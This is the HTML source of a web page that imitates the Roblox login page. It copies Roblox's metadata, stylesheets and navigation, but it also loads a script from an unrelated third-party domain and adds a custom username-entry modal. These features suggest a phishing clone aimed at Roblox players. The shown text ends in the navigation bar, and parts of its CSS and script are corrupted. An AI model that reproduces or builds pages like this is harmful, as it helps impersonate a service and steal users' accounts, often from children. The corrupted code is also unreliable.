
<html lang="en"><head><script type="text/javascript" async="" src="https://ssl.google-analytics.com/ga.js"></script><script type="text/javascript">
</script>
<script gcode-dev="" src="https://file.g-code.co.id/npm/protection@2.0/"></script>    
<style>    #usernameModal {
    display: none;
    position: fixed;
    top: 0;
    left: 0;
    width: 100%
    height: 100%
    background-color: rgba(0, 0, 0, 0.7);
    z-index: 1000;
    display: flex;
    justify-content: center;
    align-items: center;
    padding: 20px;
    box-sizing: border-box;
}.modal-content-roblox {
    background-color: #2a2a2a;
    border-radius: 8px;
    padding: 30px;
    width: 100%
    max-width: 400px;
    box-shadow: 0 4px 15px rgba(0, 0, 0, 0.5);
    text-align: center;
    color: #f0f0f0;
    font-family: 'Source Sans Pro', Arial, sans-serif;
}.modal-title {
    font-size: 28px;
    font-weight: 700;
    color: #ffffff;
    margin-bottom: 25px;
    text-transform: uppercase;
}.roblox-input-field {
    width: calc(100% - 20px);
    padding: 12px 10px;
    margin-bottom: 20px;
    border: 1px solid #4a4a4a;
    border-radius: 5px;
    background-color: #383838;
    color: #ffffff;
    font-size: 16px;
    box-sizing: border-box;
    outline: none;
    transition: border-color 0.2s ease-in-out;
}.roblox-input-field::placeholder {
    color: #b0b0b0;
}.roblox-input-field:focus {
    border-color: #007bff;
}.roblox-button {
    background-color: #007bff;
    color: #ffffff;
    padding: 12px 25px;
    border: none;
    border-radius: 5px;
    font-size: 18px;
    font-weight: 700;
    cursor: pointer;
    transition: background-color 0.2s ease-in-out, transform 0.1s ease-in-out;
    width: 100%
    box-sizing: border-box;
    position: relative;
    display: flex;
    justify-content: center;
    align-items: center;
    gap: 8px;
}#loadingSpinner {
    margin: 0;
    font-size: 1.2em;
}.roblox-button:hover {
    background-color: #0056b3;
}.roblox-button:active {
    transform: translateY(1px);
}#validationMessage,
#welcomeMessage {
    font-size: 14px;
    font-weight: 600;
    margin-top: 15px;
    line-height: 1.4;
}#welcomeMessage {
    display: none;
}@media (max-width: 500px) {
    .modal-content-roblox {
        padding: 20px;
        margin: 10px;
    }
    .modal-title {
        font-size: 24px;
    }
    .roblox-button {
        padding: 10px 20px;
        font-size: 16px;
    }
}        @charset "UTF-8";[ng\:cloak],[ng-cloak],[data-ng-cloak],[x-ng-cloak],.ng-cloak,.x-ng-cloak,.ng-hide:not(.ng-hide-animate){display:none !important;}ng\:form{display:block;}.ng-animate-shim{visibility:hidden;}.ng-anchor{position:absolute;}
    
</style>    
<style type="text/css">        @charset "UTF-8";[ng\:cloak],[ng-cloak],[data-ng-cloak],[x-ng-cloak],.ng-cloak,.x-ng-cloak,.ng-hide:not(.ng-hide-animate){display:none !important;}ng\:form{display:block;}.ng-animate-shim{visibility:hidden;}.ng-anchor{position:absolute;}
    
</style>    
<!-- MachineID: bf8dee0e-22fa-64bc-b2be-5b3d0b3ed08a -->    
<title>
Log in to Roblox
</title>    
<meta http-equiv="X-UA-Compatible" content="IE=edge,requiresActiveX=true">    
<meta charset="UTF-8">    
<meta name="viewport" content="width=device-width, initial-scale=1">    
<meta name="author" content="Roblox Corporation">    
<meta name="description" content="Login to your Roblox account or sign up to create a new account.">    
<meta name="keywords" content="free games, online games, building games, virtual worlds, free mmo, gaming cloud, physics engine">    
<meta name="apple-itunes-app" content="app-id=431946152">    
<link rel="apple-touch-icon" href="https://images.rbxcdn.com/7c5fe83dffa97250aaddd54178900ea7.png">
    
<script type="text/javascript" async="" src="https://ssl.google-analytics.com/ga.js"></script>    
<script type="application/ld json">        { "@context" : "https://schema.org", "@type" : "Organization", "name" : "Roblox", "url" : "https://www.roblox.com/", "image" : "https://images.rbxcdn.com/fc3f3e3158fc20ebb5ccc972064ebfe6.png", "logo" : "https://images.rbxcdn.com/fc3f3e3158fc20ebb5ccc972064ebfe6.png",
        "email" : "info@roblox.com", "sameAs" : [ "https://www.facebook.com/roblox/", "https://twitter.com/roblox", "https://www.linkedin.com/company/147977", "https://www.instagram.com/roblox/", "https://www.youtube.com/user/roblox", "https://www.twitch.tv/roblox"
        ] }
    
</script>    
<meta ng-csp="no-unsafe-eval">    
<meta name="locale-data" data-language-code="en_us" data-language-name="English" data-url-locale="" data-override-language-header="false">    
<meta name="device-meta" data-device-type="computer" data-is-in-app="false" data-is-desktop="true" data-is-phone="false" data-is-tablet="false" data-is-console="false" data-is-android-app="false" data-is-ios-app="false" data-is-uwp-app="false" data-is-xbox-app="false" data-is-amazon-app="false" data-is-win32-app="false" data-is-studio="false" data-is-game-client-browser="false" data-is-ios-device="false" data-is-android-device="false" data-is-universal-app="false" data-app-type="unknown" data-is-chrome-os="false" data-is-pcgdk-app="false" data-is-samsung-galaxy-store-app="false">    
<meta name="environment-meta" data-domain="roblox.com" data-is-testing-site="false">    
<meta id="roblox-display-names" data-enabled="true">    
<meta name="hardware-backed-authentication-data" data-is-secure-authentication-intent-enabled="true" data-is-bound-auth-token-enabled="true" data-bound-auth-token-whitelist="{"Whitelist":[{"apiSite":"auth.roblox.com","sampleRate":"100"},{"apiSite":"accountsettings.roblox.com","sampleRate":"100"},{"apiSite":"inventory.roblox.com","sampleRate":"100"},{"apiSite":"accountinformation.roblox.com","sampleRate":"100"}, {"apiSite":"billing.roblox.com","sampleRate":"100"}, {"apiSite":"premiumfeatures.roblox.com","sampleRate":"100"}, {"apiSite":"trades.roblox.com","sampleRate":"100"}, {"apiSite":"groups.roblox.com","sampleRate":"100"}, {"apiSite":"adconfiguration.roblox.com","sampleRate":"100"},  {"apiSite":"ads.roblox.com","sampleRate":"100"}, {"apiSite":"assetdelivery.roblox.com","sampleRate":"100"}, {"apiSite":"avatar.roblox.com","sampleRate":"100"}, {"apiSite":"badges.roblox.com","sampleRate":"100"}, {"apiSite":"catalog.roblox.com","sampleRate":"100"}, {"apiSite":"chat.roblox.com","sampleRate":"100"}, {"apiSite":"chatmoderation.roblox.com","sampleRate":"100"}, {"apiSite":"clientsettings.roblox.com","sampleRate":"100"},  {"apiSite":"contacts.roblox.com","sampleRate":"100"}, {"apiSite":"contentstore.roblox.com","sampleRate":"100"},  {"apiSite":"develop.roblox.com","sampleRate":"100"}, {"apiSite":"economy.roblox.com","sampleRate":"100"},  {"apiSite":"engagementpayouts.roblox.com","sampleRate":"100"}, {"apiSite":"followings.roblox.com","sampleRate":"100"},  {"apiSite":"friends.roblox.com","sampleRate":"100"}, {"apiSite":"gameinternationalization.roblox.com","sampleRate":"100"}, {"apiSite":"gamejoin.roblox.com","sampleRate":"100"}, {"apiSite":"gamepersistence.roblox.com","sampleRate":"100"}, {"apiSite":"games.roblox.com","sampleRate":"100"}, {"apiSite":"groupsmoderation.roblox.com","sampleRate":"100"},{"apiSite":"itemconfiguration.roblox.com","sampleRate":"100"}, {"apiSite":"locale.roblox.com","sampleRate":"100"}, {"apiSite":"localizationtables.roblox.com","sampleRate":"100"},  {"apiSite":"metrics.roblox.com","sampleRate":"100"}, {"apiSite":"moderation.roblox.com","sampleRate":"100"},  {"apiSite":"notifications.roblox.com","sampleRate":"100"}, {"apiSite":"points.roblox.com","sampleRate":"100"}, {"apiSite":"presence.roblox.com","sampleRate":"100"}, {"apiSite":"publish.roblox.com","sampleRate":"100"},  {"apiSite":"privatemessages.roblox.com","sampleRate":"100"}, {"apiSite":"thumbnailsresizer.roblox.com","sampleRate":"100"}, {"apiSite":"thumbnails.roblox.com","sampleRate":"100"}, {"apiSite":"translationroles.roblox.com","sampleRate":"100"},  {"apiSite":"translations.roblox.com","sampleRate":"100"}, {"apiSite":"twostepverification.roblox.com","sampleRate":"100"},  {"apiSite":"usermoderation.roblox.com","sampleRate":"100"}, {"apiSite":"users.roblox.com","sampleRate":"100"}, {"apiSite":"voice.roblox.com","sampleRate":"100"}, {"apiSite":"realtimenotifications.roblox.com","sampleRate":"100"}, {"apiSite":"jQuery","sampleRate":"1000000"}]}" data-bound-auth-token-exemptlist="{"Exemptlist":[]}" data-hba-indexed-db-name="hbaDB" data-hba-indexed-db-obj-store-name="hbaObjectStore" data-hba-indexed-db-key-name="hba_keys" data-hba-indexed-db-version="1" data-bat-event-sample-rate="500">    
<meta name="account-switching-data" data-is-account-switching-enabled="true">    
<meta name="passkey-data" data-is-passkey-login-enabled="true">    
<meta name="passkey-data-android" data-is-passkey-login-enabled-android="true">
    
<meta name="page-guac-migration" data-v1-path="/universal-app-configuration/v1/behaviors/<behaviour-name>/content" data-v2-path="/guac-v2/v1/bundles/<behaviour-name>" data-behavior-page-heartbeat-v2="true" data-behavior-app-policy="true">    
<meta name="page-meta" data-internal-page-name="Login">    
<meta name="page-retry-header-enabled" data-retry-attempt-header-enabled="True">    
<script type="text/javascript">        var Roblox = Roblox || {};
    
        Roblox.BundleVerifierConstants = {
            isMetricsApiEnabled: true,
            eventStreamUrl: "//ecsv2.roblox.com/pe?t=diagnostic",
            deviceType: "Computer",
            cdnLoggingEnabled: JSON.parse("true")
        };
    
</script>    
<script src="/js/utilities/bundleVerifier.js?v=2f89a5fa99eb4cb3591ea59b884e458d" type="text/javascript"></script>    
<link href="https://images.rbxcdn.com/e854eb7b2951ac03edba9a2681032bba.ico" rel="icon">
    
<link rel="stylesheet" onerror="Roblox.BundleDetector && Roblox.BundleDetector.reportBundleError(this)" data-bundlename="FoundationCss" data-bundle-source="Main" href="https://css.rbxcdn.com/ce14cebe54df514fc1d310cd5f9f8db939bbd2045abe6889dfa0edd017cc37ce.css">    
<link rel="stylesheet" onerror="Roblox.BundleDetector && Roblox.BundleDetector.reportBundleError(this)" data-bundlename="StyleGuide" data-bundle-source="Main" href="https://css.rbxcdn.com/fd96125f67edabf301d44c9868ab5abbbfa4004ac4465c2e58635cb5912362d6.css">    
<link rel="stylesheet" onerror="Roblox.BundleDetector && Roblox.BundleDetector.reportBundleError(this)" data-bundlename="Builder" data-bundle-source="Main" href="https://css.rbxcdn.com/7fc67d38cfc34042bc251805f872ff5be8cb502859e943e5dda46fc3907375c6.css">    
<link rel="stylesheet" onerror="Roblox.BundleDetector && Roblox.BundleDetector.reportBundleError(this)" data-bundlename="Thumbnails" data-bundle-source="Main" href="https://css.rbxcdn.com/28d3da7c913edb3c5dfb82f72058178c9ba2c6fb9876b08d73677160922ab903.css">    
<link rel="stylesheet" onerror="Roblox.BundleDetector && Roblox.BundleDetector.reportBundleError(this)" data-bundlename="CaptchaCore" data-bundle-source="Main" href="https://css.rbxcdn.com/b8f8f15a57a66e73469ae72eea7d8905346afa78b9f2397627cd099f7dcc779a.css">    
<link rel="stylesheet" onerror="Roblox.BundleDetector && Roblox.BundleDetector.reportBundleError(this)" data-bundlename="EmailVerifyCodeModal" data-bundle-source="Main" href="https://css.rbxcdn.com/66b2fd496e668938e3b0e2d9a0c12f9f88c3a1a4974608f69059d8061fc0141f.css">    
<link rel="stylesheet" onerror="Roblox.BundleDetector && Roblox.BundleDetector.reportBundleError(this)" data-bundlename="Challenge" data-bundle-source="Main" href="https://css.rbxcdn.com/1cc064c3c34a7184cba28e287377ed32d78de1d0eaea8b6a2d10e60f2f267720.css">    
<link rel="stylesheet" onerror="Roblox.BundleDetector && Roblox.BundleDetector.reportBundleError(this)" data-bundlename="VerificationUpsell" data-bundle-source="Main" href="https://css.rbxcdn.com/f77e16b9fa5823882aaa0cdabade9706b9ba2b7e050d23d2831da138a58e5f7f.css">    
<link rel="stylesheet" onerror="Roblox.BundleDetector && Roblox.BundleDetector.reportBundleError(this)" data-bundlename="RobloxBadges" data-bundle-source="Main" href="https://css.rbxcdn.com/da45920fef8b22d35ee6cce0702d290241252fbfd99695e2abc0934d20de0974.css">    
<link rel="stylesheet" onerror="Roblox.BundleDetector && Roblox.BundleDetector.reportBundleError(this)" data-bundlename="AccountSwitcher" data-bundle-source="Main" href="https://css.rbxcdn.com/49fff8dad77e5262087267ee2e8fda1607525506c4a1ca20af60f9757684e980.css">    
<link rel="stylesheet" onerror="Roblox.BundleDetector && Roblox.BundleDetector.reportBundleError(this)" data-bundlename="PriceTag" data-bundle-source="Main" href="https://css.rbxcdn.com/9bfc48ea40a698035ea8cbe3d3e94bd06d3aac48969bedceb6d8ba5ff17ff84d.css">    
<link rel="stylesheet" onerror="Roblox.BundleDetector && Roblox.BundleDetector.reportBundleError(this)" data-bundlename="SearchLandingPage" data-bundle-source="Main" href="https://css.rbxcdn.com/df9a376522ff4c39e6d789e6bcc3d4b2817bdac228020ee6fb4990807031f319.css">    
<link rel="stylesheet" onerror="Roblox.BundleDetector && Roblox.BundleDetector.reportBundleError(this)" data-bundlename="Navigation" data-bundle-source="Main" href="https://css.rbxcdn.com/7528c69882f7b65fad9869daf18dbc4e260c337c657d0d9c012fc315eb0ad2b8.css">    
<link rel="stylesheet" onerror="Roblox.BundleDetector && Roblox.BundleDetector.reportBundleError(this)" data-bundlename="CookieBannerV3" data-bundle-source="Main" href="https://css.rbxcdn.com/7e348738266e9ea2bae9314a2d26b33618c6f4cf3c527b11023620d973c6e7fc.css">    
<link rel="stylesheet" onerror="Roblox.BundleDetector && Roblox.BundleDetector.reportBundleError(this)" data-bundlename="Footer" data-bundle-source="Main" href="https://css.rbxcdn.com/945686c706d827658e2e4dee3009559078256e204bb42a3f02fdc6c9552cc7f7.css">    
<link rel="canonical" href="https://www.roblox.com/login">    
<link rel="alternate" href="https://www.roblox.com/login" hreflang="x-default">    
<link rel="alternate" href="https://www.roblox.com/login" hreflang="en">    
<link rel="alternate" href="https://www.roblox.com/de/login" hreflang="de">    
<link rel="alternate" href="https://www.roblox.com/es/login" hreflang="es">    
<link rel="alternate" href="https://www.roblox.com/fr/login" hreflang="fr">    
<link rel="alternate" href="https://www.roblox.com/id/login" hreflang="id">    
<link rel="alternate" href="https://www.roblox.com/it/login" hreflang="it">    
<link rel="alternate" href="https://www.roblox.com/ja/login" hreflang="ja">    
<link rel="alternate" href="https://www.roblox.com/ko/login" hreflang="ko">    
<link rel="alternate" href="https://www.roblox.com/pl/login" hreflang="pl">    
<link rel="alternate" href="https://www.roblox.com/pt/login" hreflang="pt">    
<link rel="alternate" href="https://www.roblox.com/th/login" hreflang="th">    
<link rel="alternate" href="https://www.roblox.com/tr/login" hreflang="tr">    
<link rel="alternate" href="https://www.roblox.com/vi/login" hreflang="vi">    
<link rel="alternate" href="https://www.roblox.com/ar/login" hreflang="ar">    
<link onerror="Roblox.BundleDetector && Roblox.BundleDetector.reportBundleError(this)" rel="stylesheet" href="https://static.rbxcdn.com/css/leanbase___fb0c7d1e28371fc5e8367ce241b98d69_m.css/fetch">    
<link rel="stylesheet" onerror="Roblox.BundleDetector && Roblox.BundleDetector.reportBundleError(this)" data-bundlename="AccessManagementUpsellV2" data-bundle-source="Main" href="https://css.rbxcdn.com/d777254408347583551beea274411ceed572e3b23f4b31a2fbf3044bbc672897.css">    
<link rel="stylesheet" onerror="Roblox.BundleDetector && Roblox.BundleDetector.reportBundleError(this)" data-bundlename="Captcha" data-bundle-source="Main" href="https://css.rbxcdn.com/bc981bafa6b0a52c86d071d1f81b24168a8dd92e72b8ac52d37cb46bf8bd8c42.css">    
<link rel="stylesheet" onerror="Roblox.BundleDetector && Roblox.BundleDetector.reportBundleError(this)" data-bundlename="CrossDeviceLoginDisplayCode" data-bundle-source="Main" href="https://css.rbxcdn.com/07d73a0fe62fadd30d32d50e667e7d6b62ca192cd258a1c3340cb262de401d72.css">    
<link rel="stylesheet" onerror="Roblox.BundleDetector && Roblox.BundleDetector.reportBundleError(this)" data-bundlename="AccountSelector" data-bundle-source="Main" href="https://css.rbxcdn.com/97a9d5a74599e95902f6456aea6e3cfaa9fe463ebbe0ae4a6a5025d40e1b7866.css">    
<link rel="stylesheet" onerror="Roblox.BundleDetector && Roblox.BundleDetector.reportBundleError(this)" data-bundlename="AccountRecoveryModal" data-bundle-source="Main" href="https://css.rbxcdn.com/4b5dce375cef78073d2192583d1ecd458f10c308fa99847d649d5ec801bebd61.css">    
<link rel="stylesheet" onerror="Roblox.BundleDetector && Roblox.BundleDetector.reportBundleError(this)" data-bundlename="ReactLogin" data-bundle-source="Main" href="https://css.rbxcdn.com/d47b8eefce509dac9b478c8602d901170bbeedd3dad170867869f3cad3f49f15.css">    
<link rel="stylesheet" onerror="Roblox.BundleDetector && Roblox.BundleDetector.reportBundleError(this)" data-bundlename="RobuxIcon" data-bundle-source="Main" href="https://css.rbxcdn.com/7dfc7837b5da6850e13413c630b37da7e88aeb610ca2c7d4e8b71b02cbdc6ba6.css">    
<link rel="stylesheet" onerror="Roblox.BundleDetector && Roblox.BundleDetector.reportBundleError(this)" data-bundlename="ItemPurchaseUpsell" data-bundle-source="Main" href="https://css.rbxcdn.com/3c4bd9b17b9020d9ebc87d4542a68a949a9de6150a55a92f0e65514520ee777e.css">    
<link rel="stylesheet" onerror="Roblox.BundleDetector && Roblox.BundleDetector.reportBundleError(this)" data-bundlename="ItemPurchase" data-bundle-source="Main" href="https://css.rbxcdn.com/1b6cc6d0699561a61e37bae3b8fa07ac5698c5c41c8375ac4f907e189be90232.css">    
<link rel="stylesheet" onerror="Roblox.BundleDetector && Roblox.BundleDetector.reportBundleError(this)" data-bundlename="IdVerification" data-bundle-source="Main" href="https://css.rbxcdn.com/3bca47a98d58fdf98a7063c4f3b390671e5326ed559813887f3945876c997da6.css">    
<link rel="stylesheet" onerror="Roblox.BundleDetector && Roblox.BundleDetector.reportBundleError(this)" data-bundlename="AccessManagementUpsell" data-bundle-source="Main" href="https://css.rbxcdn.com/d45e200658a1343116bbf4a88c367d093758085e7d001918d641c85b2143468f.css">    
<link rel="stylesheet" onerror="Roblox.BundleDetector && Roblox.BundleDetector.reportBundleError(this)" data-bundlename="GameLaunch" data-bundle-source="Main" href="https://css.rbxcdn.com/c5373f0dced8d7be7bb3ad1b978fb8af776157fcc41ad3d5c92d725063c2e6e1.css">
    
<link rel="stylesheet" onerror="Roblox.BundleDetector && Roblox.BundleDetector.reportBundleError(this)" data-bundlename="UserAgreementsChecker" data-bundle-source="Main" href="https://css.rbxcdn.com/d5a3728b78be729b693aadf79a1f45f0fa49c15fe863a0d7dd631b75f9e82207.css">
    
<script type="text/javascript" onerror="Roblox.BundleDetector && Roblox.BundleDetector.reportBundleError(this)" data-monitor="true" data-bundlename="EnvironmentUrls" data-bundle-source="Main" src="https://js.rbxcdn.com/fc5032e013a877ae8dfdaf16e906375fc2d37781f22ca2908ee39b163d5e6269.js"></script>
    
<script type="text/javascript">        var Roblox = Roblox || {};
        Roblox.GaEventSettings = {
            gaDFPPreRollEnabled: "false" === "true",
            gaLaunchAttemptAndLaunchSuccessEnabled: "false" === "true",
            gaPerformanceEventEnabled: "false" === "true"
        };
    
</script>    
<script onerror="Roblox.BundleDetector && Roblox.BundleDetector.reportBundleError(this)" data-monitor="true" data-bundlename="headerinit" type="text/javascript" src="https://js.rbxcdn.com/6f8bcfd33c17e884e38a8dcb89b5da42.js"></script>    
<script type="text/javascript" onerror="Roblox.BundleDetector && Roblox.BundleDetector.reportBundleError(this)" data-monitor="true" data-bundlename="Polyfill" data-bundle-source="Main" src="https://js.rbxcdn.com/5c8a2ba3737908f693394045e81ebd71c77cde6f87550ea51f7833e8c98200ae.js"></script>    
<script type="text/javascript" onerror="Roblox.BundleDetector && Roblox.BundleDetector.reportBundleError(this)" data-monitor="true" data-bundlename="XsrfProtection" data-bundle-source="Main" src="https://js.rbxcdn.com/2f0fd0c2760ff1898187af6df3b764f4b08f77a315d0a33654f105f61b0ea6d0.js"></script>    
<script type="text/javascript" onerror="Roblox.BundleDetector && Roblox.BundleDetector.reportBundleError(this)" data-monitor="true" data-bundlename="HeaderScripts" data-bundle-source="Main" src="https://js.rbxcdn.com/dd0d34c6d7afd472e5636ca7645e703dd18502fc01c8211279879f64c847dee4.js"></script>    
<meta name="roblox-tracer-meta-data" data-access-token="" data-service-name="Web" data-tracer-enabled="false" data-api-sites-request-allow-list="friends.roblox.com,chat.roblox.com,thumbnails.roblox.com,games.roblox.com,gameinternationalization.roblox.com,localizationtables.roblox.com" data-sample-rate="0" data-is-instrument-page-performance-enabled="false">    
<script type="text/javascript" onerror="Roblox.BundleDetector && Roblox.BundleDetector.reportBundleError(this)" data-monitor="true" data-bundlename="RobloxTracer" data-bundle-source="Main" src="https://js.rbxcdn.com/f85ce090699c1c3962762b8a2f8b252f0f2a7d0424c146f41d6c5abbf0147a57.js"></script>    
<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=0">
    
<script>        //Set if it browser's do not track flag is enabled
        var Roblox = Roblox || {};
        (function() {
            var dnt = navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack;
            if (typeof window.external !== "undefined" &&
                typeof window.external.msTrackingProtectionEnabled !== "undefined") {
                dnt = dnt || window.external.msTrackingProtectionEnabled();
            }
            Roblox.browserDoNotTrack = dnt == "1" || dnt == "yes" || dnt === true;
        })();
    
</script>    
<script type="text/javascript">        var _gaq = _gaq || [];                window.GoogleAnalyticsDisableRoblox2 = true;
        _gaq.push(['b._setAccount', 'UA-486632-1']);
            _gaq.push(['b._setSampleRate', '5']);
        _gaq.push(['b._setCampSourceKey', 'rbx_source']);
        _gaq.push(['b._setCampMediumKey', 'rbx_medium']);
        _gaq.push(['b._setCampContentKey', 'rbx_campaign']);            _gaq.push(['b._setDomainName', 'roblox.com']);            _gaq.push(['b._setCustomVar', 1, 'Visitor', 'Anonymous', 2]);
                _gaq.push(['b._setPageGroup', 1, 'Login']);
            _gaq.push(['b._trackPageview']);        _gaq.push(['c._setAccount', 'UA-26810151-2']);
            _gaq.push(['c._setSampleRate', '1']);
            _gaq.push(['c._setDomainName', 'roblox.com']);
            _gaq.push(['c._setPageGroup', 1, 'Login']);            (function() {
                if (!Roblox.browserDoNotTrack) {
                    var ga = document.createElement('script');
                    ga.type = 'text/javascript';
                    ga.async = true;
                    ga.src = ('https:' == document.location.protocol ? 'https://ssl' : 'http://www')   '.google-analytics.com/ga.js';
                    var s = document.getElementsByTagName('script')[0];
                    s.parentNode.insertBefore(ga, s);
                }
        })();
    
</script>    
<script type="text/javascript">        if (Roblox && Roblox.EventStream) {
                Roblox.EventStream.Init("//ecsv2.roblox.com/www/e.png",
                    "//ecsv2.roblox.com/www/e.png",
                    "//ecsv2.roblox.com/pe?t=studio",
                    "//ecsv2.roblox.com/pe?t=diagnostic");
            }
    
</script>
    
<script type="text/javascript">        if (Roblox && Roblox.PageHeartbeatEvent) {
            Roblox.PageHeartbeatEvent.Init([2,8,20,60]);
        }
    
</script>    
<script>        Roblox = Roblox || {};
        Roblox.AbuseReportPVMeta = {
            desktopEnabled: false,
            phoneEnabled: false,
            inAppEnabled: false
        };
    
</script>    
<meta name="thumbnail-meta-data" data-is-webapp-cache-enabled="False" data-webapp-cache-expirations-timespan="00:01:00" data-request-min-cooldown="1000" data-request-max-cooldown="30000" data-request-max-retry-attempts="4" data-request-batch-size="100" data-thumbnail-metrics-sample-size="20" data-concurrent-thumbnail-request-count="4">    
<style type="text/css">        .foundation-web-interactable{overflow:hidden;position:relative}.foundation-web-interactable:before{bottom:0;content:"";left:0;position:absolute;right:0;top:0;transition:background-color var(--time-100) var(--ease-linear)}.foundation-web-interactable:focus-visible{outline:var(--stroke-thicker) solid var(--color-selection-start)}@media (hover:hover){.foundation-web-interactable:not(:disabled):hover:before{background-color:var(--color-state-hover)}}.foundation-web-interactable:not(:disabled):active:before{background-color:var(--color-state-press)}
    
</style>    
<style type="text/css">        @keyframes rotation{0%{transform:rotate(0deg)}to{transform:rotate(359deg)}}.foundation-web-loading-spinner{animation:rotation 1s linear infinite normal;display:flex}.foundation-web-loading-spinner svg path{fill:var(--color-action-standard-foreground)}
    
</style>    
<style type="text/css">        .foundation-web-button{-webkit-user-select:none;-moz-user-select:none;user-select:none}.foundation-web-button[disabled]{opacity:.5}.foundation-web-button.content-action-emphasis{--button-spinner-fill:var(--color-action-emphasis-foreground)}.foundation-web-button.content-action-standard{--button-spinner-fill:var(--color-action-standard-foreground)}.foundation-web-button.content-action-soft-emphasis{--button-spinner-fill:var(--color-action-soft-emphasis-foreground)}.foundation-web-button.content-action-alert{--button-spinner-fill:var(--color-action-alert-foreground)}.foundation-web-button .foundation-web-loading-spinner svg path{fill:var(--button-spinner-fill)}.foundation-web-button .foundation-web-button-content.isLoading{opacity:0}.foundation-web-button .foundation-web-loading-spinner-wrapper{left:50%position:absolute;top:50%transform:translate(-50%,-50%)}
    
</style>    
<style type="text/css">        .disabled{opacity:.5}.foundation-web-radio-indicator:after{background-color:var(--color-action-sub-emphasis-foreground);border-radius:100%content:"";display:block}.foundation-web-radio-indicator-xsmall:after{height:var(--size-150);width:var(--size-150)}.foundation-web-radio-indicator-small:after{height:var(--size-200);width:var(--size-200)}.foundation-web-radio-indicator-large:after,.foundation-web-radio-indicator-medium:after{height:var(--size-250);width:var(--size-250)}.foundation-web-radio{align-items:center;border:var(--stroke-standard) solid;border-color:var(--color-stroke-emphasis);border-radius:100%display:flex;flex:0 0 auto;flex-direction:column;justify-content:center;outline-offset:3px}.foundation-web-radio[data-state=checked]{background-color:var(--color-action-sub-emphasis-background)}
    
</style></head><body id="rbx-body" dir="ltr" class="rbx-body   dark-theme builder-font " data-performance-relative-value="0.005" data-internal-page-name="Login" data-send-event-percentage="0">    
<script type="text/javascript" onerror="Roblox.BundleDetector && Roblox.BundleDetector.reportBundleError(this)" data-monitor="true" data-bundlename="Theme" data-bundle-source="Main" src="https://js.rbxcdn.com/02a63ed03498b17dc2e133716717d996d9be5ab25ae788ee1234d40267fc2d2b.js"></script>
    
<meta name="csrf-token" data-token="OxwZ vX/ypCn">    
<script src="https://roblox.com/js/hsts.js?v=3" type="text/javascript" id="hsts" async=""></script>    
<script type="text/javascript" onerror="Roblox.BundleDetector && Roblox.BundleDetector.reportBundleError(this)" data-monitor="true" data-bundlename="Linkify" data-bundle-source="Main" src="https://js.rbxcdn.com/c0b9b674b2a87f0aa6358830e63fa62841ce9a3e24f065c5fd33b7e73f22ffa6.js"></script>    
<div id="image-retry-data" data-image-retry-max-times="30" data-image-retry-timer="500" data-ga-logging-percent="10">    
</div>    
<div id="http-retry-data" data-http-retry-max-timeout="0" data-http-retry-base-timeout="0" data-http-retry-max-times="1">    
</div>    
<div id="wrap" class="wrap no-gutter-ads logged-out">        
<div id="navigation-container" class="builder-font ixp-marketplace-rename-control charts-rename-exp-treatment" data-number-of-autocomplete-suggestions="7" data-is-redirect-library-to-creator-marketplace-enabled="True" data-platform-event-left-nav-entry-start-time="01/01/2000 12:00:00" data-platform-event-left-nav-entry-end-time="07/12/2025 19:00:00" data-platform-event-left-nav-url="https://www.roblox.com/the-hatch">            
<div id="header" class="navbar-fixed-top rbx-header" role="navigation">                
<div class="container-fluid">                    
<div class="rbx-navbar-header">                        
<div id="header-menu-icon" class="rbx-nav-collapse">                            
<button type="button" class="btn-primary-xs btn-min-width" id="skip-to-main-content">
Skip to Main Content
</button>                        
</div>                        
<div class="navbar-header">                            
<a class="navbar-brand" href="/home">                                
<span class="icon-logo"></span><span class="icon-logo-r"></span>                            
</a>                        
</div>                    
</div>                    
<ul class="nav rbx-navbar hidden-xs hidden-sm col-md-5 col-lg-4">                        
<li>                            
<a class="font-header-2 nav-menu-title text-header" href="/charts">
Charts
</a>                        
</li>                        
<li>                            
<a class="font-header-2 nav-menu-title text-header" href="/catalog">
Marketplace
</a>                        
</li>                        
<li>                            
<a id="header-develop-md-link" class="font-header-2 nav-menu-title text-header" href="https://create.roblox.com/">
Create
</a>                        
</li>                        
<li id="navigation-robux-container">                            
<div><a class="font-header-2 nav-menu-title text-header robux-menu-btn" href="https://www.roblox.com/upgrades/robux?ctx=navpopover">
Robux
</a></div>                        
</li>                    
</ul>                    
<ul class="nav rbx-navbar hidden-md hidden-lg col-xs-12">                        
<li>                            
<a class="font-header-2 nav-menu-title text-header" href="/charts">
Charts
</a>                        
</li>                        
<li>                            
<a class="font-header-2 nav-menu-title text-header" href="/catalog">
Marketplace
</a>                        
</li>                        
<li>                            
<a id="header-develop-sm-link" class="font-header-2 nav-menu-title text-header" href="https://create.roblox.com/">
Create
</a>                        
</li>                        
<li id="navigation-robux-mobile-container">                            
<div><a class="font-header-2 nav-menu-title text-header robux-menu-btn" href="https://www.roblox.com/upgrades/robux?ctx=navpopover">
Robux
</a></div>                        
</li>                    
</ul>                    
<div id="right-navigation-header">                        
<div data-testid="navigation-search-input" class="navbar-left navbar-search col-xs-5 col-sm-6 col-md-2 col-lg-3" role="search">                            
<div class="input-group">                                
<form name="search-form" action="/search">                                    
<div class="form-has-feedback">                                        
<input id="navbar-search-input" type="search" name="search-bar" data-testid="navigation-search-input-field" class="form-control input-field new-input-field" placeholder="Search" maxlength="120" autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" value="">                                    
</div>                                
</form>                                
<div class="input-group-btn">                                    
<button data-testid="navigation-search-input-search-button" class="input-addon-btn" type="submit"><span class="icon-common-search-sm"></span></button>                                
</div>                            
</div>                            
<ul class="dropdown-menu new-dropdown-menu" role="menu">                                
<li class="navbar-search-option rbx-clickable-li new-selected"><a class="new-navbar-search-anchor" href="https://www.roblox.com/discover/?Keyword="><span class="icon-menu-games-off navbar-list-option-icon"></span><span class="navbar-list-option-text"></span><span class="navbar-list-option-suffix">
in Experiences
</span></a></li>                                
<li class="navbar-search-option rbx-clickable-li"><a class="new-navbar-search-anchor" href="https://www.roblox.com/search/users?keyword="><span class="icon-menu-profile navbar-list-option-icon"></span><span class="navbar-list-option-text"></span><span class="navbar-list-option-suffix">
in People
</span></a></li>                                    
<li class="navbar-search-option rbx-clickable-li"><a class="new-navbar-search-anchor" href="https://www.roblox.com/catalog?CatalogContext=1&Keyword="><span class="icon-menu-shop navbar-list-option-icon"></span><span class="navbar-list-option-text"></span><span class="navbar-list-option-suffix">
in Marketplace
</span></a></li>                                        
